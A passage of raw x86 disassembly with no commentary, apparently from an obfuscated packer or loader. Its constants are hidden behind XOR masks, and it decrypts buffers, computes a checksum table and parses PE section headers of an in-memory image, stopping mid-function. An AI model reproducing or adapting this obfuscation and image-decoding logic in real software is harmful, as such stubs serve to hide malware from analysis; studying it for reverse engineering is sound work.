  42710c:	mov    DWORD PTR [ebp-0x8],esi
  42710f:	mov    ecx,DWORD PTR [ebp-0x4]
  427112:	xor    ecx,eax
  427114:	lea    edi,[edi+ecx*1+0x3272f8]
  42711b:	mov    ecx,DWORD PTR [ebp-0xc]
  42711e:	mov    esi,DWORD PTR [ebp-0x4]
  427121:	xor    esi,eax
  427123:	xor    ecx,eax
  427125:	sub    ecx,esi
  427127:	cmp    edi,ecx
  427129:	jbe    0x4270d5
  42712b:	mov    eax,DWORD PTR [ebp-0x8]
  42712e:	pop    edi
  42712f:	mov    DWORD PTR [ebx],eax
  427131:	mov    eax,DWORD PTR [ebp-0x8]
  427134:	pop    esi
  427135:	leave  
  427136:	ret    
  427137:	push   ebp
  427138:	mov    ebp,esp
  42713a:	sub    esp,0x38
  42713d:	push   ebx
  42713e:	mov    ebx,0xf89c85b9
  427143:	mov    DWORD PTR [ebp-0x4],ebx
  427146:	lea    ecx,[ebx-0x1]
  427149:	mov    DWORD PTR [ebp-0x24],ecx
  42714c:	mov    eax,DWORD PTR [ebp-0x4]
  42714f:	mov    edx,DWORD PTR [ebp+0x8]
  427152:	push   esi
  427153:	mov    esi,0x75108b1
  427158:	xor    eax,esi
  42715a:	push   edi
  42715b:	mov    edi,0x3272f8
  427160:	add    eax,edi
  427162:	cmp    edx,eax
  427164:	mov    eax,DWORD PTR [ebp-0x4]
  427167:	je     0x4272cc
  42716d:	mov    edx,DWORD PTR [ebp+0xc]
  427170:	xor    eax,esi
  427172:	add    eax,edi
  427174:	cmp    edx,eax
  427176:	je     0x4272c9
  42717c:	mov    eax,DWORD PTR [ebp+0x10]
  42717f:	mov    edx,DWORD PTR [ebp+0xc]
  427182:	mov    DWORD PTR [ebp-0x14],eax
  427185:	mov    eax,DWORD PTR [ebp+0x8]
  427188:	mov    DWORD PTR [ebp-0x18],0xf89c8523
  42718f:	mov    DWORD PTR [ebp-0xc],eax
  427192:	lea    eax,[ebx+0x2]
  427195:	mov    DWORD PTR [ebp-0x1c],eax
  427198:	mov    DWORD PTR [ebp-0x10],ebx
  42719b:	mov    DWORD PTR [ebp+0xc],ecx
  42719e:	mov    DWORD PTR [ebp+0x10],eax
  4271a1:	mov    eax,DWORD PTR [ebp+0xc]
  4271a4:	xor    eax,esi
  4271a6:	mov    DWORD PTR [ebp-0x20],edx
  4271a9:	sub    edx,eax
  4271ab:	sub    edx,edi
  4271ad:	mov    DWORD PTR [ebp+0x8],edx
  4271b0:	mov    DWORD PTR [ebp-0x8],0xf89c85bc
  4271b7:	jmp    0x4272b9
  4271bc:	mov    eax,DWORD PTR [ebp+0xc]
  4271bf:	mov    ecx,DWORD PTR [ebp+0xc]
  4271c2:	xor    eax,esi
  4271c4:	xor    ecx,esi
  4271c6:	lea    ecx,[eax+ecx*1+0x64e5f0]
  4271cd:	mov    eax,DWORD PTR [ebp+0x8]
  4271d0:	xor    edx,edx
  4271d2:	div    ecx
  4271d4:	mov    eax,DWORD PTR [ebp+0x10]
  4271d7:	mov    ecx,DWORD PTR [ebp+0xc]
  4271da:	xor    eax,esi
  4271dc:	xor    ecx,esi
  4271de:	sub    eax,ecx
  4271e0:	cmp    edx,eax
  4271e2:	jne    0x427278
  4271e8:	mov    eax,DWORD PTR [ebp+0x8]
  4271eb:	mov    ecx,DWORD PTR [ebp-0xc]
  4271ee:	mov    dl,BYTE PTR [eax+ecx*1]
  4271f1:	mov    eax,DWORD PTR [ebp-0x10]
  4271f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4271f7:	xor    eax,esi
  4271f9:	xor    ecx,esi
  4271fb:	add    eax,edi
  4271fd:	add    ecx,edi
  4271ff:	cmp    eax,ecx
  427201:	jae    0x427249
  427203:	lea    ecx,[eax-0x3272f8]
  427209:	mov    DWORD PTR [ebp-0x4],ecx
  42720c:	mov    ebx,DWORD PTR [ebp-0x4]
  42720f:	xor    ebx,esi
  427211:	add    ebx,0x7f55d8fb
  427217:	lea    ecx,[ebp+eax*4-0x38]
  42721b:	mov    DWORD PTR [ecx],ebx
  42721d:	mov    ebx,DWORD PTR [ecx]
  42721f:	cmp    ebx,0x244ecb9a
  427225:	jbe    0x42722f
  427227:	add    DWORD PTR [ecx],0x405fcdd
  42722d:	jmp    0x427235
  42722f:	add    DWORD PTR [ecx],0xfdaf4323
  427235:	mov    ecx,DWORD PTR [ebp-0x8]
  427238:	xor    ecx,esi
  42723a:	inc    eax
  42723b:	inc    DWORD PTR [ebp-0x4]
  42723e:	add    ecx,edi
  427240:	cmp    eax,ecx
  427242:	jb     0x42720c
  427244:	mov    ebx,0xf89c85b9
  427249:	cmp    DWORD PTR [ebp-0x14],0x0
  42724d:	jne    0x427257
  42724f:	xor    dl,0x80
  427252:	add    dl,0x5
  427255:	jmp    0x42726d
  427257:	mov    eax,DWORD PTR [ebp-0x18]
  42725a:	xor    al,0xb1
  42725c:	mov    cl,0x8
  42725e:	sub    cl,al
  427260:	add    dl,cl
  427262:	mov    ecx,DWORD PTR [ebp-0x1c]
  427265:	xor    cl,0xb1
  427268:	sub    cl,0x8
  42726b:	ror    dl,cl
  42726d:	xor    eax,eax
  42726f:	mov    eax,DWORD PTR [ebp+0x8]
  427272:	mov    ecx,DWORD PTR [ebp-0xc]
  427275:	mov    BYTE PTR [eax+ecx*1],dl
  427278:	mov    eax,DWORD PTR [ebp+0x8]
  42727b:	mov    ecx,DWORD PTR [ebp-0x10]
  42727e:	sub    eax,edi
  427280:	xor    eax,esi
  427282:	cmp    eax,ecx
  427284:	jne    0x4272a7
  427286:	mov    eax,DWORD PTR [ebp+0x10]
  427289:	mov    ecx,DWORD PTR [ebp+0xc]
  42728c:	xor    eax,esi
  42728e:	xor    ecx,esi
  427290:	sub    eax,ecx
  427292:	mov    ecx,DWORD PTR [ebp-0x20]
  427295:	sub    eax,edi
  427297:	xor    eax,esi
  427299:	mov    DWORD PTR [ebp+0x10],eax
  42729c:	mov    eax,DWORD PTR [ebp+0xc]
  42729f:	xor    eax,esi
  4272a1:	sub    ecx,eax
  4272a3:	sub    ecx,edi
  4272a5:	jmp    0x4272b6
  4272a7:	mov    eax,DWORD PTR [ebp+0xc]
  4272aa:	xor    eax,esi
  4272ac:	mov    ecx,0xffcd8d08
  4272b1:	sub    ecx,eax
  4272b3:	add    ecx,DWORD PTR [ebp+0x8]
  4272b6:	mov    DWORD PTR [ebp+0x8],ecx
  4272b9:	mov    eax,DWORD PTR [ebp+0x10]
  4272bc:	cmp    eax,ebx
  4272be:	jne    0x4271bc
  4272c4:	mov    eax,DWORD PTR [ebp-0x24]
  4272c7:	jmp    0x4272cc
  4272c9:	mov    eax,DWORD PTR [ebp-0x4]
  4272cc:	xor    eax,esi
  4272ce:	add    eax,edi
  4272d0:	pop    edi
  4272d1:	pop    esi
  4272d2:	pop    ebx
  4272d3:	leave  
  4272d4:	ret    0xc
  4272d7:	push   ebp
  4272d8:	mov    ebp,esp
  4272da:	sub    esp,0x420
  4272e0:	mov    DWORD PTR [ebp-0x14],0xf89c85b9
  4272e7:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  4272ee:	mov    DWORD PTR [ebp-0x18],0xf89c86b9
  4272f5:	push   ebx
  4272f6:	mov    DWORD PTR [ebp-0x1c],0xf89c85b6
  4272fd:	mov    eax,DWORD PTR [ebp-0x14]
  427300:	push   esi
  427301:	mov    esi,0x75108b1
  427306:	push   edi
  427307:	xor    eax,esi
  427309:	mov    edi,0x3272f8
  42730e:	add    eax,edi
  427310:	mov    DWORD PTR [ebp-0x8],eax
  427313:	mov    DWORD PTR [ebp-0x20],0xf89c85a1
  42731a:	mov    DWORD PTR [ebp-0x4],0xead71899
  427321:	mov    DWORD PTR [ebp-0x10],0x8
  427328:	mov    ecx,ecx
  42732a:	mov    eax,DWORD PTR [ebp-0xc]
  42732d:	mov    ecx,DWORD PTR [ebp-0x14]
  427330:	xor    eax,esi
  427332:	xor    ecx,esi
  427334:	add    eax,edi
  427336:	add    ecx,edi
  427338:	imul   eax,ecx
  42733b:	jmp    0x42736e
  42733d:	mov    eax,DWORD PTR [ebp-0x4]
  427340:	sub    eax,edi
  427342:	xor    eax,esi
  427344:	mov    DWORD PTR [ebp-0x8],eax
  427347:	lea    ebx,[ebp-0x8]
  42734a:	call   0x42708f
  42734f:	mov    DWORD PTR [ebp-0x8],eax
  427352:	mov    eax,DWORD PTR [ebp-0x8]
  427355:	mov    ecx,DWORD PTR [ebp-0x4]
  427358:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  42735f:	mov    eax,DWORD PTR [ebp-0xc]
  427362:	mov    ecx,DWORD PTR [ebp-0x4]
  427365:	xor    eax,esi
  427367:	lea    eax,[eax+ecx*1+0x3272f8]
  42736e:	mov    DWORD PTR [ebp-0x4],eax
  427371:	mov    eax,DWORD PTR [ebp-0x18]
  427374:	mov    ecx,DWORD PTR [ebp-0xc]
  427377:	xor    ecx,esi
  427379:	xor    eax,esi
  42737b:	sub    eax,ecx
  42737d:	mov    ecx,DWORD PTR [ebp-0x4]
  427380:	cmp    ecx,eax
  427382:	jbe    0x42733d
  427384:	mov    eax,DWORD PTR [ebp-0x1c]
  427387:	xor    eax,esi
  427389:	add    eax,edi
  42738b:	mov    DWORD PTR [ebp-0x8],eax
  42738e:	mov    DWORD PTR [ebp-0x18],0xf89c86b6
  427395:	mov    ebx,ebx
  427397:	jmp    0x4273fa
  427399:	mov    ecx,DWORD PTR [ebp-0x20]
  42739c:	mov    eax,DWORD PTR [ebp-0x8]
  42739f:	xor    ecx,esi
  4273a1:	add    ecx,edi
  4273a3:	shr    eax,cl
  4273a5:	mov    DWORD PTR [ebp-0x4],eax
  4273a8:	mov    eax,DWORD PTR [ebp+0x8]
  4273ab:	mov    cl,BYTE PTR [eax]
  4273ad:	mov    BYTE PTR [ebp+0xb],cl
  4273b0:	mov    cl,BYTE PTR [ebp+0xb]
  4273b3:	mov    edx,DWORD PTR [ebp-0x8]
  4273b6:	movzx  ecx,cl
  4273b9:	xor    ecx,edx
  4273bb:	mov    DWORD PTR [ebp+0x8],ecx
  4273be:	mov    ecx,DWORD PTR [ebp-0x18]
  4273c1:	mov    edx,DWORD PTR [ebp+0x8]
  4273c4:	xor    ecx,esi
  4273c6:	add    ecx,edi
  4273c8:	and    ecx,edx
  4273ca:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  4273d1:	mov    edx,DWORD PTR [ebp-0x4]
  4273d4:	xor    ecx,edx
  4273d6:	mov    DWORD PTR [ebp-0x8],ecx
  4273d9:	mov    ecx,DWORD PTR [ebp-0xc]
  4273dc:	xor    ecx,esi
  4273de:	lea    eax,[eax+ecx*1+0x3272f8]
  4273e5:	mov    DWORD PTR [ebp+0x8],eax
  4273e8:	mov    eax,DWORD PTR [ebp-0xc]
  4273eb:	xor    eax,esi
  4273ed:	mov    ecx,0xffcd8d08
  4273f2:	sub    ecx,eax
  4273f4:	add    ecx,DWORD PTR [ebp-0x10]
  4273f7:	mov    DWORD PTR [ebp-0x10],ecx
  4273fa:	mov    eax,DWORD PTR [ebp-0x14]
  4273fd:	mov    ecx,DWORD PTR [ebp-0x10]
  427400:	xor    eax,esi
  427402:	add    eax,edi
  427404:	cmp    ecx,eax
  427406:	jne    0x427399
  427408:	mov    eax,DWORD PTR [ebp-0x1c]
  42740b:	mov    ecx,DWORD PTR [ebp-0x8]
  42740e:	xor    eax,esi
  427410:	add    eax,edi
  427412:	pop    edi
  427413:	pop    esi
  427414:	xor    eax,ecx
  427416:	pop    ebx
  427417:	leave  
  427418:	ret    0x4
  42741b:	push   ebp
  42741c:	mov    ebp,esp
  42741e:	mov    eax,DWORD PTR [ebp+0x1c]
  427421:	mov    ecx,DWORD PTR [ebp+0x8]
  427424:	mov    edx,DWORD PTR [ebp+0x10]
  427427:	mov    eax,DWORD PTR [eax+0x190]
  42742d:	mov    eax,DWORD PTR [eax]
  42742f:	sub    esp,0x64
  427432:	push   ebx
  427433:	push   esi
  427434:	push   edi
  427435:	mov    edi,0x75108b1
  42743a:	xor    ecx,edi
  42743c:	mov    ebx,0x3272f8
  427441:	add    ecx,ebx
  427443:	cmp    ecx,edx
  427445:	jne    0x427456
  427447:	or     DWORD PTR ds:0x3750c3f,0x4263ebce
  427451:	jmp    0x427952
  427456:	mov    ecx,DWORD PTR [ebp+0x8]
  427459:	mov    esi,DWORD PTR [ebp+0x14]
  42745c:	mov    edx,DWORD PTR [esi]
  42745e:	xor    ecx,edi
  427460:	add    ecx,ebx
  427462:	cmp    edx,ecx
  427464:	je     0x42790d
  42746a:	mov    ecx,DWORD PTR [ebp+0x1c]
  42746d:	mov    DWORD PTR [ebp-0x1c],eax
  427470:	mov    DWORD PTR [ebp+0x1c],ecx
  427473:	mov    ecx,DWORD PTR [ebp+0x18]
  427476:	mov    eax,DWORD PTR [esi]
  427478:	mov    DWORD PTR [ebp-0x20],eax
  42747b:	mov    DWORD PTR [ebp+0x8],0xf89c85b9
  427482:	mov    edx,0xf89c85b8
  427487:	mov    DWORD PTR [ebp-0x8],edx
  42748a:	mov    eax,DWORD PTR [ebp+0x1c]
  42748d:	mov    DWORD PTR [ebp+0x1c],eax
  427490:	mov    eax,DWORD PTR [ebp+0x1c]
  427493:	mov    eax,DWORD PTR [eax+0x190]
  427499:	mov    eax,DWORD PTR [eax]
  42749b:	mov    DWORD PTR [ebp-0x24],ecx
  42749e:	mov    ecx,DWORD PTR [ebp+0x1c]
  4274a1:	mov    ecx,DWORD PTR [ecx+0x190]
  4274a7:	mov    ecx,DWORD PTR [ecx]
  4274a9:	add    ecx,DWORD PTR [eax+0x3c]
  4274ac:	mov    DWORD PTR [ebp+0x10],ecx
  4274af:	mov    eax,DWORD PTR [ebp+0x8]
  4274b2:	xor    eax,edi
  4274b4:	add    eax,ebx
  4274b6:	mov    DWORD PTR [ebp-0x4],eax
  4274b9:	mov    eax,DWORD PTR [ebp+0x8]
  4274bc:	xor    eax,edi
  4274be:	add    eax,ebx
  4274c0:	mov    DWORD PTR [ebp+0x18],eax
  4274c3:	mov    eax,DWORD PTR [ebp+0x10]
  4274c6:	mov    eax,DWORD PTR [eax+0x50]
  4274c9:	sub    eax,0xc
  4274cc:	mov    DWORD PTR [ebp-0x28],eax
  4274cf:	mov    eax,DWORD PTR [ebp+0x10]
  4274d2:	mov    eax,DWORD PTR [eax+0x38]
  4274d5:	mov    ecx,DWORD PTR [ebp+0x10]
  4274d8:	dec    eax
  4274d9:	test   DWORD PTR [ecx+0x54],eax
  4274dc:	mov    eax,DWORD PTR [ebp+0x10]
  4274df:	je     0x4274f9
  4274e1:	mov    eax,DWORD PTR [eax+0x38]
  4274e4:	mov    ecx,DWORD PTR [ebp+0x10]
  4274e7:	mov    ecx,DWORD PTR [ecx+0x54]
  4274ea:	dec    eax
  4274eb:	not    eax
  4274ed:	and    ecx,eax
  4274ef:	mov    eax,DWORD PTR [ebp+0x10]
  4274f2:	mov    eax,DWORD PTR [eax+0x38]
  4274f5:	add    eax,ecx
  4274f7:	jmp    0x4274fc
  4274f9:	mov    eax,DWORD PTR [eax+0x54]
  4274fc:	mov    DWORD PTR [ebp+0x1c],eax
  4274ff:	mov    eax,DWORD PTR [ebp+0x8]
  427502:	xor    eax,edi
  427504:	add    eax,ebx
  427506:	mov    DWORD PTR [ebp+0x18],eax
  427509:	mov    eax,DWORD PTR [ebp+0x8]
  42750c:	xor    eax,edi
  42750e:	add    eax,ebx
  427510:	mov    DWORD PTR [ebp+0x18],eax
  427513:	mov    eax,DWORD PTR [ebp+0x8]
  427516:	mov    ecx,DWORD PTR [ebp-0x24]
  427519:	xor    eax,edi
  42751b:	add    eax,ebx
  42751d:	mov    DWORD PTR [ecx],eax
  42751f:	mov    DWORD PTR [ebp+0x18],edx
  427522:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  427529:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  427530:	mov    DWORD PTR [ebp+0x18],0xf89c85bd
  427537:	mov    eax,DWORD PTR [ebp-0x8]
  42753a:	mov    ecx,DWORD PTR [ebp+0x1c]
  42753d:	xor    eax,edi
  42753f:	add    eax,ebx
  427541:	imul   eax,ecx
  427544:	mov    ecx,DWORD PTR [ebp+0x8]
  427547:	mov    edx,DWORD PTR [ebp-0x28]
  42754a:	xor    ecx,edi
  42754c:	lea    ecx,[ecx+edx*1+0x3272f8]
  427553:	cmp    eax,ecx
  427555:	jae    0x427906
  42755b:	mov    eax,DWORD PTR [ebp+0x8]
  42755e:	xor    eax,edi
  427560:	add    eax,ebx
  427562:	mov    DWORD PTR [ebp+0x18],eax
  427565:	mov    eax,DWORD PTR [ebp+0x1c]
  427568:	add    eax,DWORD PTR [ebp-0x1c]
  42756b:	mov    DWORD PTR [ebp-0x4],eax
  42756e:	push   DWORD PTR [ebp-0x4]
  427571:	mov    esi,DWORD PTR [ebp-0x1c]
  427574:	mov    ecx,DWORD PTR [ebp+0x10]
  427577:	call   0x4266c7
  42757c:	mov    DWORD PTR [ebp+0xc],eax
  42757f:	mov    DWORD PTR [ebp-0x18],0xf89c85a1
  427586:	mov    eax,DWORD PTR [ebp-0x18]
  427589:	xor    eax,edi
  42758b:	lea    ecx,[ebp-0x40]
  42758e:	add    eax,ebx
  427590:	push   ecx
  427591:	call   0x426c5b
  427596:	mov    eax,DWORD PTR [ebp+0xc]
  427599:	test   eax,eax
  42759b:	je     0x4275eb
  42759d:	mov    eax,DWORD PTR [ebp-0x18]
  4275a0:	xor    eax,edi
  4275a2:	add    eax,ebx
  4275a4:	push   eax
  4275a5:	push   DWORD PTR [ebp+0xc]
  4275a8:	lea    eax,[ebp-0x40]
  4275ab:	push   eax
  4275ac:	call   0x426b51
  4275b1:	mov    eax,DWORD PTR [ebp-0x4]
  4275b4:	mov    DWORD PTR [ebp-0x18],eax
  4275b7:	mov    eax,DWORD PTR [ebp-0x18]
  4275ba:	mov    ecx,DWORD PTR [ebp-0x1c]
  4275bd:	sub    eax,ecx
  4275bf:	mov    DWORD PTR [ebp-0x18],eax
  4275c2:	mov    eax,DWORD PTR [ebp+0xc]
  4275c5:	mov    ecx,DWORD PTR [ebp+0xc]
  4275c8:	mov    eax,DWORD PTR [eax+0x10]
  4275cb:	add    eax,DWORD PTR [ecx+0xc]
  4275ce:	mov    ecx,DWORD PTR [ebp-0x18]
  4275d1:	cmp    ecx,eax
  4275d3:	jb     0x4275eb
  4275d5:	mov    eax,DWORD PTR [ebp+0xc]
  4275d8:	mov    eax,DWORD PTR [eax+0xc]
  4275db:	mov    ecx,DWORD PTR [ebp+0xc]
  4275de:	add    eax,DWORD PTR [ecx+0x8]
  4275e1:	mov    ecx,DWORD PTR [ebp-0x18]
  4275e4:	sub    eax,ecx
  4275e6:	jmp    0x4278d9
  4275eb:	push   0xc
  4275ed:	push   DWORD PTR [ebp-0x4]
  4275f0:	lea    eax,[ebp-0x4c]
  4275f3:	push   eax
  4275f4:	call   0x426b51
  4275f9:	mov    eax,0xf89c85b9
  4275fe:	mov    DWORD PTR [ebp-0x2c],eax
  427601:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  427608:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  42760f:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  427616:	lea    ecx,[ebp-0x2c]
  427619:	mov    DWORD PTR [ebp-0xc],ecx
  42761c:	lea    ecx,[ebp-0x30]
  42761f:	mov    DWORD PTR [ebp-0x10],ecx
  427622:	lea    ecx,[ebp-0x34]
  427625:	mov    DWORD PTR [ebp+0xc],ecx
  427628:	lea    ecx,[ebp-0x38]
  42762b:	mov    DWORD PTR [ebp-0x14],ecx
  42762e:	mov    ecx,DWORD PTR [ebp+0x8]
  427631:	xor    ecx,edi
  427633:	add    ecx,ebx
  427635:	mov    DWORD PTR [ebp-0x18],ecx
  427638:	jmp    0x427834
  42763d:	cmp    eax,0xf89c85bb
  427642:	je     0x427846
  427648:	mov    ecx,DWORD PTR [ebp-0x8]
  42764b:	xor    ecx,edi
  42764d:	mov    esi,eax
  42764f:	add    ecx,ebx
  427651:	mov    DWORD PTR [ebp+0x18],ecx
  427654:	mov    eax,DWORD PTR [ebp-0x18]
  427657:	xor    esi,edi
  427659:	lea    eax,[eax+esi*1+0x3272f8]
  427660:	mov    DWORD PTR [ebp-0x18],eax
  427663:	mov    eax,DWORD PTR [ebp-0x8]
  427666:	mov    ecx,DWORD PTR [ebp-0x18]
  427669:	xor    eax,edi
  42766b:	add    eax,ebx
  42766d:	cmp    ecx,eax
  42766f:	jne    0x427684
  427671:	mov    eax,DWORD PTR [ebp+0x8]
  427674:	xor    eax,edi
  427676:	add    eax,ebx
  427678:	push   eax
  427679:	push   0xc
  42767b:	lea    eax,[ebp-0x4c]
  42767e:	push   eax
  42767f:	call   0x427137
  427684:	mov    eax,DWORD PTR [ebp-0xc]
  427687:	mov    eax,DWORD PTR [eax]
  427689:	xor    eax,edi
  42768b:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  427692:	mov    ecx,DWORD PTR [ebp+0x8]
  427695:	xor    ecx,edi
  427697:	movzx  eax,al
  42769a:	add    ecx,ebx
  42769c:	cmp    eax,ecx
  42769e:	je     0x42781c
  4276a4:	mov    eax,DWORD PTR [ebp-0x10]
  4276a7:	mov    eax,DWORD PTR [eax]
  4276a9:	xor    eax,edi
  4276ab:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  4276b2:	mov    ecx,DWORD PTR [ebp+0x8]
  4276b5:	xor    ecx,edi
  4276b7:	movzx  eax,al
  4276ba:	add    ecx,ebx
  4276bc:	cmp    eax,ecx
  4276be:	je     0x42781c
  4276c4:	mov    eax,DWORD PTR [ebp+0xc]
  4276c7:	mov    eax,DWORD PTR [eax]
  4276c9:	xor    eax,edi
  4276cb:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  4276d2:	mov    ecx,DWORD PTR [ebp+0x8]
  4276d5:	xor    ecx,edi
  4276d7:	movzx  eax,al
  4276da:	add    ecx,ebx
  4276dc:	cmp    eax,ecx
  4276de:	je     0x42781c
  4276e4:	mov    eax,DWORD PTR [ebp-0x14]
  4276e7:	mov    eax,DWORD PTR [eax]
  4276e9:	xor    eax,edi
  4276eb:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  4276f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4276f5:	xor    ecx,edi
  4276f7:	movzx  eax,al
  4276fa:	add    ecx,ebx
  4276fc:	cmp    eax,ecx
  4276fe:	je     0x42781c
  427704:	mov    eax,DWORD PTR [ebp-0x10]
  427707:	mov    eax,DWORD PTR [eax]
  427709:	xor    eax,edi
  42770b:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  427712:	mov    ecx,DWORD PTR [ebp-0xc]
  427715:	mov    ecx,DWORD PTR [ecx]
  427717:	xor    ecx,edi
  427719:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  427720:	xor    al,cl
  427722:	mov    ecx,DWORD PTR [ebp+0xc]
  427725:	mov    ecx,DWORD PTR [ecx]
  427727:	xor    ecx,edi
  427729:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  427730:	or     al,cl
  427732:	mov    ecx,DWORD PTR [ebp-0xc]
  427735:	mov    ecx,DWORD PTR [ecx]
  427737:	xor    ecx,edi
  427739:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b0]
  427740:	cmp    cl,al
  427742:	jne    0x42781c
  427748:	mov    eax,DWORD PTR [ebp+0xc]
  42774b:	mov    eax,DWORD PTR [eax]
  42774d:	xor    eax,edi
  42774f:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  427756:	mov    ecx,DWORD PTR [ebp-0x10]
  427759:	mov    ecx,DWORD PTR [ecx]
  42775b:	xor    ecx,edi
  42775d:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  427764:	xor    al,cl
  427766:	mov    ecx,DWORD PTR [ebp-0x14]
  427769:	mov    ecx,DWORD PTR [ecx]
  42776b:	xor    ecx,edi
  42776d:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  427774:	or     al,cl
  427776:	mov    ecx,DWORD PTR [ebp-0x10]
  427779:	mov    ecx,DWORD PTR [ecx]
  42777b:	xor    ecx,edi
  42777d:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b0]
  427784:	cmp    cl,al
  427786:	jne    0x42781c
  42778c:	mov    eax,DWORD PTR [ebp-0x14]
  42778f:	mov    eax,DWORD PTR [eax]
  427791:	xor    eax,edi
  427793:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  42779a:	mov    ecx,DWORD PTR [ebp+0xc]
  42779d:	mov    ecx,DWORD PTR [ecx]
  42779f:	xor    ecx,edi
  4277a1:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  4277a8:	xor    al,cl
  4277aa:	mov    ecx,DWORD PTR [ebp-0xc]
  4277ad:	mov    ecx,DWORD PTR [ecx]
  4277af:	xor    ecx,edi
  4277b1:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  4277b8:	or     al,cl
  4277ba:	mov    ecx,DWORD PTR [ebp+0xc]
  4277bd:	mov    ecx,DWORD PTR [ecx]
  4277bf:	xor    ecx,edi
  4277c1:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b0]
  4277c8:	cmp    cl,al
  4277ca:	jne    0x42781c
  4277cc:	mov    eax,DWORD PTR [ebp-0x14]
  4277cf:	mov    eax,DWORD PTR [eax]
  4277d1:	xor    eax,edi
  4277d3:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  4277da:	mov    ecx,DWORD PTR [ebp-0xc]
  4277dd:	mov    ecx,DWORD PTR [ecx]
  4277df:	xor    ecx,edi
  4277e1:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  4277e8:	xor    al,cl
  4277ea:	mov    ecx,DWORD PTR [ebp-0x10]
  4277ed:	mov    ecx,DWORD PTR [ecx]
  4277ef:	xor    ecx,edi
  4277f1:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  4277f8:	or     al,cl
  4277fa:	mov    ecx,DWORD PTR [ebp-0x14]
  4277fd:	mov    ecx,DWORD PTR [ecx]
  4277ff:	xor    ecx,edi
  427801:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b0]
  427808:	cmp    cl,al
  42780a:	jne    0x42781c
  42780c:	lea    eax,[ebp-0x4c]
  42780f:	push   eax
  427810:	call   0x4272d7
  427815:	mov    ecx,DWORD PTR [ebp-0x44]
  427818:	cmp    eax,ecx
  42781a:	je     0x427826
  42781c:	mov    eax,DWORD PTR [ebp+0x8]
  42781f:	xor    eax,edi
  427821:	add    eax,ebx
  427823:	mov    DWORD PTR [ebp+0x18],eax
  427826:	mov    eax,DWORD PTR [ebp-0x8]
  427829:	xor    eax,edi
  42782b:	lea    eax,[eax+esi*1+0x3272f8]
  427832:	xor    eax,edi
  427834:	mov    ecx,DWORD PTR [ebp+0x8]
  427837:	mov    edx,DWORD PTR [ebp+0x18]
  42783a:	xor    ecx,edi
  42783c:	add    ecx,ebx
  42783e:	cmp    edx,ecx
  427840:	je     0x42763d
  427846:	mov    eax,DWORD PTR [ebp+0x8]
  427849:	mov    ecx,DWORD PTR [ebp+0x18]
  42784c:	xor    eax,edi
  42784e:	add    eax,ebx
  427850:	cmp    ecx,eax
  427852:	jne    0x427865
  427854:	mov    eax,DWORD PTR [ebp-0x8]
  427857:	mov    ecx,DWORD PTR [ebp+0x1c]
  42785a:	xor    eax,edi
  42785c:	lea    eax,[eax+ecx*1+0x3272f8]
  427863:	jmp    0x4278dc
  427865:	push   0x18
  427867:	push   DWORD PTR [ebp-0x4]
  42786a:	lea    eax,[ebp-0x64]
  42786d:	push   eax
  42786e:	call   0x426b51
  427873:	mov    eax,DWORD PTR [ebp+0x8]
  427876:	mov    ecx,DWORD PTR [ebp-0x18]
  427879:	xor    eax,edi
  42787b:	add    eax,ebx
  42787d:	cmp    eax,ecx
  42787f:	je     0x427894
  427881:	mov    eax,DWORD PTR [ebp+0x8]
  427884:	xor    eax,edi
  427886:	add    eax,ebx
  427888:	push   eax
  427889:	push   0x18
  42788b:	lea    eax,[ebp-0x64]
  42788e:	push   eax
  42788f:	call   0x427137
  427894:	mov    eax,DWORD PTR [ebp-0x4]
  427897:	add    eax,0x18
  42789a:	mov    DWORD PTR [ebp+0x18],eax
  42789d:	push   DWORD PTR [ebp-0x50]
  4278a0:	push   DWORD PTR [ebp+0x18]
  4278a3:	mov    eax,DWORD PTR [ebp-0x54]
  4278a6:	add    eax,DWORD PTR [ebp-0x20]
  4278a9:	push   eax
  4278aa:	call   0x426b51
  4278af:	mov    eax,DWORD PTR [ebp+0x8]
  4278b2:	mov    ecx,DWORD PTR [ebp-0x18]
  4278b5:	xor    eax,edi
  4278b7:	add    eax,ebx
  4278b9:	cmp    eax,ecx
  4278bb:	je     0x4278ce
  4278bd:	push   0x0
  4278bf:	push   DWORD PTR [ebp-0x50]
  4278c2:	mov    eax,DWORD PTR [ebp-0x54]
  4278c5:	add    eax,DWORD PTR [ebp-0x20]
  4278c8:	push   eax
  4278c9:	call   0x427137
  4278ce:	mov    eax,DWORD PTR [ebp-0x24]
  4278d1:	mov    ecx,DWORD PTR [ebp-0x50]
  4278d4:	add    DWORD PTR [eax],ecx
  4278d6:	mov    eax,DWORD PTR [ebp-0x50]
  4278d9:	add    eax,DWORD PTR [ebp+0x1c]
  4278dc:	mov    DWORD PTR [ebp+0x1c],eax
  4278df:	mov    eax,DWORD PTR [ebp-0x8]
  4278e2:	mov    ecx,DWORD PTR [ebp+0x1c]
  4278e5:	xor    eax,edi
  4278e7:	add    eax,ebx
  4278e9:	imul   eax,ecx
